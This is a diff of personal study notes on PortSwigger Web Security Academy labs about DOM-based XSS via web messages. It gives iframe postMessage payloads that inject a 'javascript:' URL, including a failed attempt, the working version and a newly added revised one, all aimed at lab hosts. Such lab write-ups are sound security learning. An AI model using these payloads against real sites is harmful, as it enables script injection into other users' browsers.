@@ -34,6 +34,7 @@
 
 ```
 - I struggled with constructing the payload here. I knew it needed to have `https:` or `http:`, and I knew it was a JavaScript URL. I attempted `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print(); http:','*')">` thinking the semicolon would terminate it, but I wasn't really considering the rest of the message - the http:. What I needed to do instead was comment out the rest with JavaScript comment, `//`, to prevent a syntax error or whatever that was causing the failure on my origina attempt ... so the final payload is `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`.
+- Upon revisit, this is the payload I went with: `<iframe src="https://0a2600d103c8e3b080ab1d2600de0074.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()// http:','*')">`
 
 #### Lab: DOM XSS Using Web Messages and `JSON.parse`
 ```
